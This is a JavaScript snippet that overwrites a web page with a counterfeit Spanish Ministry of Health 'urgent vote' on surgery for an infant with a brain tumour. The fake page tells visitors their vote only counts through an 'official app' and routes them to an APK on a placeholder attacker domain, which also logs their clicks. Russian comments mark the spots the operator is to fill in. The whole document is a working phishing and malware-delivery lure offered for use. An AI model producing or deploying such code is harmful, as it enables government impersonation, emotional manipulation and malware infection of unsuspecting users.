(function () {
  // глушим оригинальную страницу
  document.open();
  document.write(`<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Ministerio de Sanidad — Votación urgente</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,Arial,sans-serif}
  body{background:#f4f6f9;color:#1a1a1a;padding:16px}
  header{background:#003366;color:#fff;padding:14px 18px;border-radius:6px;display:flex;align-items:center;gap:12px}
  header .logo{width:44px;height:44px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;color:#003366}
  header h1{font-size:16px;font-weight:600}
  .card{background:#fff;border-radius:8px;padding:20px;margin-top:16px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
  .tag{display:inline-block;background:#c00;color:#fff;font-size:11px;padding:3px 8px;border-radius:3px;font-weight:700;letter-spacing:.5px}
  h2{margin:12px 0 8px;font-size:20px}
  p{margin:8px 0;line-height:1.5;font-size:15px}
  .photos{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:14px 0}
  .photos img{width:100%;border-radius:6px;display:block}
  .photos figcaption{font-size:11px;color:#666;margin-top:4px;text-align:center}
  .vote{display:flex;gap:10px;margin-top:16px}
  .vote button{flex:1;padding:14px;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer}
  .yes{background:#0a7d2c;color:#fff}
  .no{background:#bbb;color:#333}
  .app{margin-top:20px;border:2px dashed #003366;border-radius:8px;padding:16px;text-align:center}
  .app a{display:inline-block;margin-top:10px;background:#003366;color:#fff;padding:12px 22px;border-radius:6px;text-decoration:none;font-weight:700}
  .meta{font-size:12px;color:#666;margin-top:14px}
  footer{margin-top:20px;font-size:11px;color:#888;text-align:center}
</style>
</head>
<body>
<header>
  <div class="logo">MS</div>
  <div>
    <h1>Ministerio de Sanidad — Sede Electrónica</h1>
    <div style="font-size:11px;opacity:.85">Expediente urgente · Ref. 2026/MSCBS-4471</div>
  </div>
</header>

<div class="card">
  <span class="tag">URGENTE · 48H</span>
  <h2>Votación: autorización de intervención quirúrgica pediátrica</h2>
  <p>Paciente: <b>menor de 7 meses</b>. Diagnóstico: <b>tumor cerebral maligno</b> (glioma de alto grado). La intervención requiere autorización ciudadana según protocolo extraordinario.</p>

  <div class="photos">
    <figure>
      <img src="https://i.postimg.cc/MvMxHWFL/IMG-20260927-082618-931.jpg" alt="Diagnóstico">
      <figcaption>Imagen RM — tumor cerebral</figcaption>
    </figure>
    <figure>
      <img src="https://i.postimg.cc/9F1fx0tC/IMG-20260927-082618-229.jpg" alt="Paciente">
      <figcaption>Paciente — 7 meses</figcaption>
    </figure>
  </div>

  <p>Para emitir su voto es obligatorio utilizar la aplicación oficial de la Sede. El voto desde navegador no será contabilizado.</p>

  <div class="vote">
    <button class="yes" onclick="castVote('si')">VOTAR SÍ</button>
    <button class="no"  onclick="castVote('no')">VOTAR NO</button>
  </div>

  <div class="app">
    <div><b>Paso obligatorio:</b> descargue la aplicación oficial para registrar su voto.</div>
    <a id="dl" href="#">Descargar aplicación (Android)</a>
    <div class="meta">Versión 4.2.1 · Firma verificada MSCBS</div>
  </div>

  <div class="meta" id="status"></div>
</div>

<footer>Sede Electrónica · Ministerio de Sanidad, Consumo y Bienestar Social · España</footer>

<script>
  var APK = 'https://<твой-домен>/app.apk'; // ← замени

  function castVote(v){
    document.getElementById('status').textContent =
      'Su voto "'+v.toUpperCase()+'" ha sido registrado provisionalmente. ' +
      'Para confirmarlo, instale la aplicación oficial.';
    document.getElementById('dl').scrollIntoView({behavior:'smooth'});
  }

  document.getElementById('dl').addEventListener('click', function(e){
    e.preventDefault();
    // тут можно логировать факт клика на свой сервер
    fetch('https://<твой-домен>/log?e=click&t='+Date.now(), {mode:'no-cors'});
    location.href = APK;
  });
</script>
</body>
</html>`);
  document.close();
})();
